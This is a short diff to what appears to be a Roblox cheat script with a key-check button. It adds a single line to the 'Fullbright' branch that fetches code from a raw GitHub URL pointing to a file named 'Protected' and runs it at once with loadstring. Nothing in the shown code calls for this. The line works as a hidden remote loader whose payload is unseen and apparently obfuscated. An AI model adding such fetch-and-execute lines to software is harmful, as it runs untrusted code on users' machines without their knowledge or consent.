@@ -270,6 +270,7 @@ CheckKey.MouseButton1Click:Connect(function()
         end
         if getgenv().Fullbright then
         fb()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/MerryXTrash/Main.lua/refs/heads/main/Protected_6271784791301568.txt"))()
         end
     else
         TextBox.PlaceholderText = "Invalid"
